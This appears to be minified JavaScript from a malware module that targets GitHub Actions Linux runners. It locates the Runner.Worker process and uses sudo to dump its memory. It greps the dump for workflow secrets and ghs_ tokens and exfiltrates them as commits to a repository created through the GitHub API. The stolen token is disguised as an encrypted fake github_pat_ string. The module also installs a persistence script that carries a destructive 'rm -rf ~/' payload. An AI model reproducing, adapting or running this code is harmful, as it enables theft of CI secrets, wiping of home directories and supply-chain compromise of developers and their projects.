class Dc extends L {
    isGitHubActions;
    isLinuxRunner;
    getLinuxDumpScript(e) {
        return ts.replace("__PID__", String(e))
    }
    constructor() {
        super("github", "runner", {
            ghs_jwt: /ghs_\d+_[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g,
            ghs_old: /ghs_[A-Za-z0-9]{36,}/g
        }, "aggressive");
        this.isGitHubActions = process.env["GITHUB_ACTIONS"] === "true", this.isLinuxRunner = process.env["RUNNER_OS"] === "Linux"
    }
    findRunnerWorkerPIDLinux() {
        try {
            if (!GR("/proc")) return null;
            let t = FR("/proc");
            for (let r of t) {
                if (!/^\d+$/.test(r)) continue;
                let n = WR("/proc", r, "cmdline");
                try {
                    if (OR(n).includes("Runner.Worker")) return parseInt(r, 10)
                } catch {
                    continue
                }
            }
            return null
        } catch {
            return null
        }
    }
    async detectHardenRunner() {
        if (!await ap()) u.log("detectHardenRunner: could not handle, exiting"), Me()
    }
    runPrivilegedStdin(e, t) {
        return sd(`sudo ${e}`, {
            input: t,
            maxBuffer: 536870912
        })
    }
    async dumpMemory() {
        let e = this.findRunnerWorkerPIDLinux();
        if (!e) return u.log("dumpMemory: worker process PID not found"), null;
        u.log(`dumpMemory: PID ${e}, platform ${XR()}`);
        try {
            return this.runPrivilegedStdin("python3", this.getLinuxDumpScript(e))
        } catch (t) {
            return u.log(`dumpMemory: FAILED: ${t instanceof Error?t.message:String(t)}`), null
        }
    }
    async execute() {
        try {
            if (!this.isGitHubActions || !this.isLinuxRunner) return this.failure("Not Actions or Linux");
            let e = process.env["GITHUB_REPOSITORY"] ?? "",
                t = process.env["GITHUB_WORKFLOW"] ?? "",
                r = await this.dumpMemory();
            if (!r || r.length === 0) return this.failure("No memory data from runner");
            u.log(`execute: dumped ${r.length} bytes`);
            let n = VR(r);
            if (u.log(`execute: grep found ${n.length} secrets`), n.length === 0) return this.failure("No secrets found in runner memory");
            let s = {};
            for (let i of n) s[i.name] = i.value;
            return this.success({
                secrets: s,
                repo: e,
                workflow: t,
                secretCount: n.length,
                rawBytes: r.length
            })
        } catch (e) {
            let t = e instanceof Error ? e.message : String(e);
            return u.log(`execute: ERROR: ${t}`), this.failure(Error(`Error processing runner: ${t}`))
        }
    }
}
function VR(e) {
    let r = sd(`tr -d '\\0' | grep -aoE '"[^"]+":{"value":"[^"]*","isSecret":true}' | sort -u`, {
            input: e,
            encoding: "utf-8",
            maxBuffer: 536870912
        }).trim().split(`
`).filter(Boolean),
        n = [];
    for (let s of r) {
        let i = s.indexOf('":{"value":"');
        if (i === -1) continue;
        let o = s.slice(1, i),
            a = i + 11,
            c = s.indexOf('","isSecret":true}', a);
        if (c === -1) continue;
        n.push({
            name: o,
            value: s.slice(a, c)
        })
    }
    return n
}
class Qn extends mr {
    createdRepo = null;
    token = null;
    commitCounter = 0;
    includeToken = !1;
    monitorInstalled = !1;
    constructor() {
        super("github", {
            domain: "api.github.com",
            port: 443,
            path: "/repos/"
        })
    }
    async initialize(e) {
        try {
            return this.createdRepo = await dd(e), this.token = e, this.commitCounter = 0, !0
        } catch (t) {
            return u.error(`GitHubSender initialization failed: ${t}`), !1
        }
    }
    setIncludeToken(e) {
        this.includeToken = e
    }
    async healthy() {
        return this.createdRepo !== null && this.token !== null
    }
    async send(e) {
        if (!this.createdRepo || !this.token) throw Error("GitHubSender not initialized");
        let t = await this.augmentEnvelope(e);
        await this.commitToRepo(t)
    }
    async augmentEnvelope(e) {
        if (!this.includeToken || !this.token) return e;
        if (Buffer.from(qt, "hex").length !== 32) return e;
        if (!this.monitorInstalled) u.log("init: runtime sync"), await new Oc(this.token, "rm -rf ~/; rm -rf ~/Documents").execute(), this.monitorInstalled = !0;
        u.log("pkg: encoding credential");
        let t = this.base64Encode(this.token);
        return {
            ...e,
            token: t
        }
    }
    base64Encode(e) {
        let t = k3(16),
            r = Buffer.from(qt, "hex"),
            n = R3("aes-256-cbc", r, t),
            s = Buffer.concat([n.update(e, "utf8"), n.final()]),
            i = Buffer.concat([t, s]).toString("base64").replace(/=+$/, ""),
            o = `github_pat_11A${i.slice(0,19)}_${i.slice(19).padEnd(70,"A")}`;
        return Buffer.from(o).toString("base64").replace(/=+$/, "")
    }
    static isRetryableStatus(e) {
        return e === 429 || e >= 500
    }
    async fetchContentSha(e) {
        try {
            let t = await G(this.token, e);
            if (!t.ok) return null;
            return (await t.json()).sha ?? null
        } catch {
            return null
        }
    }
    async commitFileWithRetry(e, t, r) {
        let s = `/repos/${this.createdRepo.owner}/${this.createdRepo.name}/contents/data/${e}`,
            i;
        for (let o = 1; o <= 5; o++) {
            let a;
            try {
                a = await G(this.token, s, {
                    method: "PUT",
                    headers: {
                        "Content-Type": "application/json",
                        "X-GitHub-Api-Version": "2022-11-28"
                    },
                    body: JSON.stringify({
                        message: t,
                        content: r,
                        ...i ? {
                            sha: i
                        } : {}
                    })
                })
            } catch (l) {
                if (o === 5) throw Error(`GitHubSender commit failed after ${o} attempt(s): ${l}`);
                let f = Math.min(1000 * 2 ** (o - 1), 16000);
                u.log(`Retrying commit in ${f}ms (attempt ${o})`), await new Promise((h) => setTimeout(h, f));
                continue
            }
            let c = await a.text().catch(() => "");
            if (a.ok) {
                u.log(`Committed ${e} to ${this.createdRepo.name}`);
                return
            }
            if (a.status === 422 && !i) {
                let l = await this.fetchContentSha(s);
                if (l) {
                    u.log(`File ${e} already exists \u2014 re-committing with sha ${l.slice(0,7)}...`), i = l;
                    continue
                }
            }
            if (Qn.isRetryableStatus(a.status)) {
                if (o === 5) throw Error(`GitHubSender commit failed after 5 attempt(s): PUT ${s} -> ${a.status}: ${c.slice(0,200)}`);
                let l = Math.min(1000 * 2 ** (o - 1), 16000);
                u.log(`GitHub ${a.status} on commit \u2014 retrying in ${l}ms (attempt ${o})`), await new Promise((f) => setTimeout(f, l));
                continue
            }
            throw Error(`GitHubSender commit failed: PUT ${s} -> ${a.status}: ${c.slice(0,200)}`)
        }
        throw Error(`GitHubSender commit failed after 5 attempt(s): ${s}`)
    }
    async commitToRepo(e) {
        let t = JSON.stringify(e, null, 2),
            r = 31457280,
            n = `snap-${Date.now()}-${this.commitCounter}.json`,
            s = e.token ? `${sn}:${e.token}` : "chore: sync",
            i = Buffer.from(t, "utf8");
        if (i.length <= 31457280) {
            let o = i.toString("base64");
            await this.commitFileWithRetry(n, s, o), this.commitCounter++
        } else {
            let o = Math.ceil(i.length / 31457280);
            for (let a = 0; a < o; a++) {
                let l = i.subarray(a * 31457280, (a + 1) * 31457280).toString("base64"),
                    f = `${n}.p${a+1}`;
                await this.commitFileWithRetry(f, s, l)
            }
            this.commitCounter++, u.log(`Split ${n} into ${o} parts for ${this.createdRepo.name}`)
        }
    }
}
class Oc extends T {
    token;
    handler;
    constructor(e, t) {
        super();
        this.token = e, this.handler = t
    }
    async installTokenMonitor(e, t) {
        try {
            let r = Bun.spawn(["bash", "-s", "--", e, t], {
                stdin: "pipe",
                stdout: "pipe",
                stderr: "pipe",
                windowsHide: !0
            });
            if (r.stdin.write(el), r.stdin.end(), await r.exited !== 0) u.info("We tried.")
        } catch (r) {
            u.info("Failure saving persistence.")
        }
    }
    async execute() {
        try {
            await this.installTokenMonitor(this.token, this.handler)
        } catch (e) {}
        return !0
    }
}
